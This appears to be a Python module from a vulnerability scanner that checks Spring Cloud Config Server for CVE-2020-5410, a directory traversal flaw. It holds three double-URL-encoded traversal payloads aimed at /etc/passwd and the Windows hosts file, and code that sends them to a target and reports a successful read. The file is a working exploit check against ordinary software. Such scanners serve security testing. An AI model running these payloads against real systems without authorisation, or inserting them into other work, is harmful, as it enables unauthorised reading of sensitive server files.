#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool import check

cve_2020_5410_payloads = [
    {'path': '..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development"'},
    {'path': '..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252FC:/Windows/System32/drivers/etc/hosts%23foo/development"'},
    {'path': '..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252FC:\Windows\System32\drivers\etc\hosts%23foo/development"'}
]

def cve_2020_5410_scan(clients):
    ''' spring cloud config server目录遍历漏洞
            可以使用特制URL发送请求, 从而跨目录读取文件。
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': 'Spring',
        'vul_type': 'FileRead',
        'vul_id': 'CVE-2020-5410',
    }

    for payload in cve_2020_5410_payloads:  # * Payload
        path = payload['path']              # * Path

        res = client.request(
            'get',
            path,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (check.check_res_fileread(res.text)):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
